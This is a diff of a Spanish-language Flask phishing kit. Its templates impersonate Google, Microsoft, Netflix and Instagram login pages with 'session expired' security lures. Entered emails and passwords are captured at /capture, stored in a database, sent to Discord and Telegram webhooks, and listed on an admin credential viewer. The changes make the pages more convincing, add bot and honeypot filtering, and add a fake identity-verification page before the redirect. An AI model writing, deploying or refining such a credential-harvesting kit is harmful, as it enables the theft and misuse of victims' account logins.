@@ -19,10 +19,10 @@ app = Flask(__name__)
 # Configuración de seguridad de sesión
 app.secret_key = os.environ.get('SECRET_KEY', 'clave-secreta-para-session-12345')
 app.config.update(
-    SESSION_COOKIE_SECURE=True,  # Solo HTTPS
-    SESSION_COOKIE_HTTPONLY=True,  # No accesible por JavaScript
-    SESSION_COOKIE_SAMESITE='Lax',  # Protección CSRF
-    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)  # Sesión expira en 2 horas
+    SESSION_COOKIE_SECURE=True,
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SAMESITE='Lax',
+    PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
 )
 
 # Configurar CSRF
@@ -37,13 +37,14 @@ CONFIG = {
     'template': 'google',
     'api_key': 'cambia-esta-clave',
     'admin_password': 'triple777',
-    'max_login_attempts': 5,  # Límite de intentos de login
-    'cleanup_days': 30  # Días para eliminar credenciales antiguas
+    'max_login_attempts': 5,
+    'cleanup_days': 30
 }
 
 # Diccionarios para rate limiting
 login_attempts = {}
 view_requests = {}
+root_requests = {}
 
 # Habilitar auditoría
 audit_log_enabled = True
@@ -91,11 +92,9 @@ def is_ip_blocked(ip):
     if ip in login_attempts:
         attempts, block_time = login_attempts[ip]
         if attempts >= CONFIG.get('max_login_attempts', 5):
-            # Bloqueo de 5 minutos
             if datetime.now() - block_time < timedelta(minutes=5):
                 return True
             else:
-                # Resetear después de 5 minutos
                 del login_attempts[ip]
     return False
 
@@ -127,7 +126,6 @@ def init_db():
                 viewed INTEGER DEFAULT 0
             )
         ''')
-        # Crear índices para mejorar el rendimiento
         cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON credentials(timestamp)')
         cursor.execute('CREATE INDEX IF NOT EXISTS idx_ip ON credentials(ip)')
         cursor.execute('CREATE INDEX IF NOT EXISTS idx_username ON credentials(username)')
@@ -138,7 +136,6 @@ def init_db():
         logger.error(f"Error al inicializar la base de datos: {e}")
 
 def cleanup_old_credentials(days=None):
-    """Elimina credenciales con más de X días"""
     if days is None:
         days = CONFIG.get('cleanup_days', 30)
     
@@ -180,11 +177,14 @@ def is_social_crawler(ua):
     return any(bot in ua.lower() for bot in social_bots)
 
 def validate_input(text):
-    """Valida que el input no contenga caracteres peligrosos"""
     if text:
-        # Solo letras, números, @, ., -, _ y espacios
         return re.match(r'^[a-zA-Z0-9@.\-_\s]+$', text) is not None
     return True
+
+def validate_email(email):
+    """Validación más estricta de email"""
+    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    return re.match(pattern, email) is not None
 
 def send_notifications(data):
     if CONFIG.get('discord_webhook'):
@@ -214,142 +214,35 @@ def send_notifications(data):
         except Exception as e:
             logger.error(f"Error al enviar notificación a Telegram: {e}")
 
-def get_template(name='google'):
-    templates = {
-        'google': '''<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Alerta de seguridad">
-    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
-    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Iniciar sesión</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
-        body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-        .container{background:white;padding:48px 40px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:100%;max-width:450px;text-align:center}
-        .logo{width:75px;margin-bottom:20px}
-        h1{font-size:24px;font-weight:400;margin-bottom:10px;color:#202124}
-        p{color:#5f6368;margin-bottom:30px}
-        input{width:100%;padding:13px 15px;margin-bottom:15px;border:1px solid #dadce0;border-radius:4px;font-size:16px}
-        input:focus{outline:none;border-color:#1a73e8}
-        button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer}
-        button:hover{background:#1557b0}
-        .footer{margin-top:30px;font-size:14px;color:#5f6368}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
-        <h1>Iniciar sesión</h1>
-        <p>Utiliza tu cuenta de Google</p>
-        <form action="/capture" method="POST">
-            <input type="email" name="email" placeholder="Correo electrónico" required autocomplete="email">
-            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
-            <button type="submit">Siguiente</button>
-        </form>
-        <div class="footer">Prueba de seguridad autorizada</div>
-    </div>
-</body>
-</html>''',
-        
-        'microsoft': '''<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Alerta de seguridad">
-    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
-    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Iniciar sesión</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
-        body{background:linear-gradient(120deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-        .container{background:white;padding:44px;width:100%;max-width:440px;box-shadow:0 4px 20px rgba(0,0,0,0.15)}
-        .logo{width:108px;margin-bottom:16px}
-        h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
-        input{width:100%;padding:12px;margin-bottom:12px;border:1px solid #ccc;font-size:15px}
-        button{width:100%;padding:12px;background:#0067b8;color:white;border:none;font-size:15px;cursor:pointer}
-        button:hover{background:#005a9e}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
-        <h1>Iniciar sesión</h1>
-        <form action="/capture" method="POST">
-            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
-        </form>
-    </div>
-</body>
-</html>''',
-        
-        'netflix': '''<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Alerta de seguridad">
-    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
-    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Netflix</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
-        body{background:#141414;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-        .container{background:rgba(0,0,0,0.75);padding:60px 68px;width:100%;max-width:450px;border-radius:4px}
-        h1{color:white;font-size:32px;margin-bottom:28px;font-weight:700}
-        input{width:100%;padding:16px;margin-bottom:16px;background:#333;border:none;border-radius:4px;color:white;font-size:16px}
-        button{width:100%;padding:16px;background:#e50914;color:white;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
-        button:hover{background:#f40612}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Iniciar sesión</h1>
-        <form action="/capture" method="POST">
-            <input type="email" name="email" placeholder="Email" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
-        </form>
-    </div>
-</body>
-</html>''',
-        
-        'instagram': '''<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Alerta de seguridad">
-    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
-    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
-    <title>Instagram</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
-        body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-        .container{background:white;border:1px solid #dbdbdb;padding:40px;width:100%;max-width:350px;text-align:center}
-        .logo{font-size:40px;font-family:'Brush Script MT',cursive;margin-bottom:30px}
-        input{width:100%;padding:9px;margin-bottom:6px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}
-        button{width:100%;padding:8px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer;margin-top:12px}
-        button:hover{background:#0081d6}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">Instagram</div>
-        <form action="/capture" method="POST">
-            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
-        </form>
-    </div>
-</body>
-</html>'''
-    }
-    return templates.get(name, templates['google'])
+@app.after_request
+def add_security_headers(response):
+    """Añadir headers de seguridad a todas las respuestas"""
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+    response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
+    
+    # CSP para la página de login y captura
+    if request.path == '/' or request.path == '/capture':
+        response.headers['Content-Security-Policy'] = (
+            "default-src 'self'; "
+            "style-src 'self' 'unsafe-inline'; "
+            "img-src 'self' https://www.google.com https://i.imgur.com https://aadcdn.msftauth.net; "
+            "font-src 'self' https://fonts.gstatic.com; "
+            "form-action 'self'; "
+            "frame-ancestors 'none'"
+        )
+    return response
+
+@app.before_request
+def limit_root_requests():
+    """Limitar peticiones a la raíz"""
+    if request.path == '/':
+        ip = get_client_ip()
+        if is_rate_limited(ip, root_requests, limit=20, window_seconds=60):
+            logger.warning(f"Rate limit excedido en raíz desde IP {ip}")
+            audit_log('ROOT_RATE_LIMIT', {'ip': ip}, ip)
+            return "⏳ Demasiadas visitas. Espera 1 minuto.", 429
 
 @app.before_request
 def handle_bots():
@@ -376,6 +269,294 @@ def handle_bots():
 </html>
 '''), 200
 
+def get_template(name='google'):
+    templates = {
+        'google': '''<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Verificación de seguridad</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif}
+        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
+        .logo{width:75px;margin-bottom:20px}
+        h1{font-size:24px;font-weight:500;margin-bottom:10px;color:#202124}
+        p{color:#5f6368;margin-bottom:25px;font-size:14px}
+        .security-badge{background:#e8f0fe;color:#1a73e8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
+        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #dadce0;border-radius:8px;font-size:16px;transition:all 0.3s}
+        input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 3px rgba(26,115,232,0.2)}
+        button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
+        button:hover{background:#1557b0;transform:translateY(-2px);box-shadow:0 4px 12px rgba(26,115,232,0.3)}
+        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
+        .footer{margin-top:25px;font-size:13px;color:#5f6368}
+        .loading{display:none;margin:10px 0}
+        .spinner{border:3px solid #f3f3f3;border-top:3px solid #1a73e8;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .error{color:#d93025;background:#fce8e6;padding:10px;border-radius:8px;margin-bottom:15px;display:none}
+        .honeypot{display:none}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
+        <div class="security-badge">🔒 Verificación de seguridad</div>
+        <h1>Tu sesión ha expirado</h1>
+        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
+        
+        <div id="error" class="error"></div>
+        
+        <form action="/capture" method="POST" id="loginForm">
+            <input type="email" name="email" placeholder="Correo electrónico" required autocomplete="email">
+            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+            
+            <div class="honeypot">
+                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
+            </div>
+            
+            <button type="submit" id="submitBtn">Continuar</button>
+            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
+        </form>
+        <div class="footer">🔐 Conexión segura</div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            btn.disabled = true;
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            setTimeout(function() {
+                btn.disabled = false;
+                btn.style.display = 'block';
+                loading.style.display = 'none';
+            }, 15000);
+        });
+    </script>
+</body>
+</html>''',
+        
+        'microsoft': '''<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Verificación de seguridad</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+        body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%;max-width:440px;text-align:center}
+        .logo{width:108px;margin-bottom:20px}
+        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#1b1b1b}
+        p{color:#5f6368;margin-bottom:25px;font-size:14px}
+        .security-badge{background:#e8f0fe;color:#0067b8;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
+        input{width:100%;padding:14px 16px;margin-bottom:14px;border:1px solid #ccc;border-radius:8px;font-size:16px;transition:all 0.3s}
+        input:focus{outline:none;border-color:#0067b8;box-shadow:0 0 0 3px rgba(0,103,184,0.2)}
+        button{width:100%;padding:14px;background:#0067b8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:500;cursor:pointer;transition:all 0.3s}
+        button:hover{background:#005a9e;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,103,184,0.3)}
+        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
+        .footer{margin-top:25px;font-size:13px;color:#5f6368}
+        .loading{display:none;margin:10px 0}
+        .spinner{border:3px solid #f3f3f3;border-top:3px solid #0067b8;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .error{color:#d93025;background:#fce8e6;padding:10px;border-radius:8px;margin-bottom:15px;display:none}
+        .honeypot{display:none}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
+        <div class="security-badge">🔒 Verificación de seguridad</div>
+        <h1>Tu sesión ha expirado</h1>
+        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
+        
+        <div id="error" class="error"></div>
+        
+        <form action="/capture" method="POST" id="loginForm">
+            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required autocomplete="email">
+            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+            
+            <div class="honeypot">
+                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
+            </div>
+            
+            <button type="submit" id="submitBtn">Iniciar sesión</button>
+            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
+        </form>
+        <div class="footer">🔐 Conexión segura</div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            btn.disabled = true;
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            setTimeout(function() {
+                btn.disabled = false;
+                btn.style.display = 'block';
+                loading.style.display = 'none';
+            }, 15000);
+        });
+    </script>
+</body>
+</html>''',
+        
+        'netflix': '''<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Verificación de seguridad</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Helvetica Neue',sans-serif}
+        body{background:linear-gradient(135deg,#141414 0%, #000000 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.8);width:100%;max-width:440px;text-align:center}
+        h1{color:white;font-size:28px;margin-bottom:10px;font-weight:700}
+        p{color:#999;margin-bottom:25px;font-size:14px}
+        .security-badge{background:#e50914;color:white;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
+        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#333;border:1px solid #555;border-radius:8px;color:white;font-size:16px;transition:all 0.3s}
+        input:focus{outline:none;border-color:#e50914;box-shadow:0 0 0 3px rgba(229,9,20,0.2)}
+        input::placeholder{color:#888}
+        button{width:100%;padding:14px;background:#e50914;color:white;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;transition:all 0.3s}
+        button:hover{background:#f40612;transform:translateY(-2px);box-shadow:0 4px 12px rgba(229,9,20,0.4)}
+        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
+        .footer{margin-top:25px;font-size:13px;color:#666}
+        .loading{display:none;margin:10px 0}
+        .spinner{border:3px solid #333;border-top:3px solid #e50914;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .error{color:#e50914;background:rgba(229,9,20,0.1);padding:10px;border-radius:8px;margin-bottom:15px;display:none}
+        .honeypot{display:none}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="font-size:40px;font-family:'Helvetica Neue',sans-serif;margin-bottom:30px;">NETFLIX</h1>
+        <div class="security-badge">🔒 Verificación de seguridad</div>
+        <h1>Tu sesión ha expirado</h1>
+        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
+        
+        <div id="error" class="error"></div>
+        
+        <form action="/capture" method="POST" id="loginForm">
+            <input type="email" name="email" placeholder="Email" required autocomplete="email">
+            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+            
+            <div class="honeypot">
+                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
+            </div>
+            
+            <button type="submit" id="submitBtn">Iniciar sesión</button>
+            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
+        </form>
+        <div class="footer">🔐 Conexión segura</div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            btn.disabled = true;
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            setTimeout(function() {
+                btn.disabled = false;
+                btn.style.display = 'block';
+                loading.style.display = 'none';
+            }, 15000);
+        });
+    </script>
+</body>
+</html>''',
+        
+        'instagram': '''<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Alerta de seguridad">
+    <meta property="og:description" content="Hemos detectado un nuevo inicio de sesión en tu cuenta de Google en un dispositivo Windows.">
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png">
+    <title>Verificación de seguridad</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,sans-serif}
+        body{background:linear-gradient(135deg,#fafafa 0%, #e0e0e0 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .container{background:white;border:1px solid #dbdbdb;padding:48px 40px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.1);width:100%;max-width:400px;text-align:center}
+        .logo{font-size:44px;font-family:'Brush Script MT',cursive;margin-bottom:20px}
+        h1{font-size:24px;font-weight:600;margin-bottom:10px;color:#262626}
+        p{color:#8e8e8e;margin-bottom:25px;font-size:14px}
+        .security-badge{background:#e8f0fe;color:#0095f6;padding:8px 16px;border-radius:20px;font-size:12px;display:inline-block;margin-bottom:20px}
+        input{width:100%;padding:14px 16px;margin-bottom:14px;background:#fafafa;border:1px solid #dbdbdb;border-radius:8px;font-size:16px;transition:all 0.3s}
+        input:focus{outline:none;border-color:#0095f6;box-shadow:0 0 0 3px rgba(0,149,246,0.2)}
+        button{width:100%;padding:14px;background:#0095f6;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
+        button:hover{background:#0081d6;transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,149,246,0.3)}
+        button:disabled{opacity:0.7;cursor:not-allowed;transform:none}
+        .footer{margin-top:25px;font-size:13px;color:#8e8e8e}
+        .loading{display:none;margin:10px 0}
+        .spinner{border:3px solid #f3f3f3;border-top:3px solid #0095f6;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite;margin:0 auto}
+        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+        .error{color:#d93025;background:#fce8e6;padding:10px;border-radius:8px;margin-bottom:15px;display:none}
+        .honeypot{display:none}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <div class="security-badge">🔒 Verificación de seguridad</div>
+        <h1>Tu sesión ha expirado</h1>
+        <p>Vuelve a iniciar sesión para verificar tu identidad</p>
+        
+        <div id="error" class="error"></div>
+        
+        <form action="/capture" method="POST" id="loginForm">
+            <input type="text" name="email" placeholder="Teléfono, usuario o correo" required autocomplete="username">
+            <input type="password" name="password" placeholder="Contraseña" required autocomplete="current-password">
+            
+            <div class="honeypot">
+                <input type="text" name="honeypot" tabindex="-1" autocomplete="off">
+            </div>
+            
+            <button type="submit" id="submitBtn">Iniciar sesión</button>
+            <div class="loading" id="loading"><div class="spinner"></div><p style="margin-top:10px;color:#666;font-size:14px;">Verificando...</p></div>
+        </form>
+        <div class="footer">🔐 Conexión segura</div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('submitBtn');
+            const loading = document.getElementById('loading');
+            btn.disabled = true;
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            setTimeout(function() {
+                btn.disabled = false;
+                btn.style.display = 'block';
+                loading.style.display = 'none';
+            }, 15000);
+        });
+    </script>
+</body>
+</html>'''
+    }
+    return templates.get(name, templates['google'])
+
 @app.route('/')
 def index():
     return render_template_string(get_template(CONFIG.get('template', 'google')))
@@ -383,10 +564,29 @@ def index():
 @app.route('/capture', methods=['POST'])
 def capture():
     ip = get_client_ip()
-    geo = get_geo(ip)
+    
+    # Verificar honeypot
+    if request.form.get('honeypot'):
+        logger.warning(f"Bot detectado en IP {ip}")
+        audit_log('BOT_DETECTED', {'ip': ip}, ip)
+        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
     
     username = request.form.get('email', '') or request.form.get('username', '')
     password = request.form.get('password', '')
+    
+    # Validar email
+    if not validate_email(username):
+        logger.warning(f"Email inválido desde {ip}: {username}")
+        audit_log('INVALID_EMAIL', {'username': username, 'ip': ip}, ip)
+        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
+    
+    # Validar que la contraseña no esté vacía
+    if not password or len(password) < 4:
+        logger.warning(f"Contraseña muy corta desde {ip}")
+        audit_log('SHORT_PASSWORD', {'ip': ip}, ip)
+        return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
+    
+    geo = get_geo(ip)
     
     # Validar entrada para prevenir inyecciones
     if not validate_input(username):
@@ -423,14 +623,38 @@ def capture():
         logger.error(f"Error al guardar credencial: {e}")
     
     send_notifications(data)
-    return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
+    
+    # Redirigir con página de verificación (más realista)
+    return render_template_string('''
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="2;url=https://www.google.com">
+    <title>Verificación exitosa</title>
+    <style>
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; background: #f0f2f5; margin: 0; }
+        .container { text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #202124; font-weight: 400; }
+        p { color: #5f6368; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h2>Verificando tu identidad...</h2>
+        <p>Serás redirigido automáticamente.</p>
+    </div>
+</body>
+</html>
+''')
 
 @app.route('/login-credenciales', methods=['GET', 'POST'])
 def login_credenciales():
     ip = get_client_ip()
     max_attempts = CONFIG.get('max_login_attempts', 5)
     
-    # Verificar si la IP está bloqueada (con tiempo de expiración)
     if is_ip_blocked(ip):
         audit_log('LOGIN_BLOCKED', {'ip': ip}, ip)
         return render_template_string('''
@@ -457,7 +681,6 @@ def login_credenciales():
     if request.method == 'POST':
         password = request.form.get('password')
         if password == CONFIG.get('admin_password', 'triple777'):
-            # Login exitoso, resetear intentos
             login_attempts.pop(ip, None)
             session['admin_logged'] = True
             session.permanent = True
@@ -465,7 +688,6 @@ def login_credenciales():
             audit_log('LOGIN_SUCCESS', {'ip': ip}, ip)
             return redirect('/ver-credenciales')
         else:
-            # Incrementar intentos fallidos con timestamp
             if ip not in login_attempts:
                 login_attempts[ip] = [0, datetime.now()]
             login_attempts[ip][0] += 1
@@ -535,7 +757,6 @@ def ver_credenciales():
     
     ip = get_client_ip()
     
-    # Rate limiting para vistas (10 por minuto)
     if is_rate_limited(ip, view_requests, limit=10, window_seconds=60):
         logger.warning(f"Rate limit excedido desde IP {ip} en /ver-credenciales")
         audit_log('RATE_LIMIT_VIEWS', {'ip': ip}, ip)
@@ -556,9 +777,8 @@ def ver_credenciales():
             </div>
         </body>
         </html>
-        ''', 429
+        ''', 429)
     
-    # Sanitizar filtros
     allowed_params = ['ip', 'username', 'location']
     filters = {}
     
@@ -575,7 +795,6 @@ def ver_credenciales():
     
     audit_log('VIEW_CREDENTIALS', {'filters': filters, 'count': len(filters)}, ip)
     
-    # Construir consulta con filtros
     query = 'SELECT id, timestamp, ip, username, password, geo_location FROM credentials WHERE 1=1'
     params = []
     
@@ -604,7 +823,6 @@ def ver_credenciales():
     if not rows:
         return "<h1>📭 No hay credenciales capturadas aún</h1>"
     
-    # Construir HTML con filtros y tabla
     html = """
     <!DOCTYPE html>
     <html>
@@ -690,18 +908,15 @@ def ver_credenciales():
 
 @app.route('/api/credentials/<int:credential_id>', methods=['DELETE', 'POST'])
 def delete_credential(credential_id):
-    """Eliminar una credencial específica"""
     if not session.get('admin_logged'):
         audit_log('UNAUTHORIZED_DELETE', {'credential_id': credential_id})
         return jsonify({'error': 'No autorizado'}), 401
     
     ip = get_client_ip()
     
-    # Verificar confirmación
     if request.method == 'POST' and request.form.get('confirm') != 'true':
         return jsonify({'error': 'Se requiere confirmación'}), 400
     
-    # Límite de eliminaciones por sesión (20)
     session.setdefault('delete_count', 0)
     if session.get('delete_count', 0) >= 20:
         audit_log('DELETE_LIMIT_EXCEEDED', {'credential_id': credential_id}, ip)
@@ -785,7 +1000,6 @@ def stats():
 
 @app.route('/api/cleanup', methods=['POST'])
 def api_cleanup():
-    """Endpoint para limpieza manual de credenciales antiguas"""
     key = request.headers.get('X-API-Key')
     if key != CONFIG.get('api_key'):
         audit_log('UNAUTHORIZED_CLEANUP', {'ip': get_client_ip()})
@@ -794,13 +1008,11 @@ def api_cleanup():
     ip = get_client_ip()
     days = request.args.get('days', CONFIG.get('cleanup_days', 30), type=int)
     
-    # Validar días
     if days < 1:
         return jsonify({'error': 'Los días deben ser al menos 1'}), 400
     if days > 365:
         return jsonify({'error': 'Máximo 365 días permitidos'}), 400
     
